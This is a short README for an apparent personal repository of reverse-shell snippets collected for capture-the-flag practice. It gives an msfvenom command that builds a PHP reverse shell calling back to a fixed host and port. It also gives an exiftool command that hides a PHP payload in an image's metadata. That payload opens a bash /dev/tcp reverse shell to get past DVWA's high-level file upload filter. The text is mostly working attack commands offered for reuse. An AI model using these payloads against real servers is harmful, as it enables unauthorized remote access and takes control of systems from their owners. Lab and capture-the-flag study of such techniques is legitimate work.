# reverse-shell

While working on various CTF challenges, I discovered the need for reverse shell scripts to gain remote access to compromised systems.
With the goal of streamlining this process, I compiled a list of useful scripts that I have personally used in CTF competitions.

Although there are numerous resources available online, I created this repository primarily for my own reference.
However, I am sharing it here to provide others with access to these scripts, which can be used at their discretion.

It is important to note that these scripts should only be used for legitimate purposes, such as remote administration of systems or troubleshooting.
Any misuse of these scripts is strictly prohibited and may result in legal consequences.


# Generate custom shell

msfvenom -p php/reverse_php lport=4444 lhost=192.168.29.4 > ./php_reverse_shell.php


# Find shell into local system

locate reverse | grep php


# DVWA File Upload high

exiftool -Comment="<?php \$command = '/bin/bash -c \"bash -i >& /dev/tcp/192.168.29.4/4444 0>&1\"'; \$output = shell_exec(\$command); echo \$output; ?>" dvwa_error.png
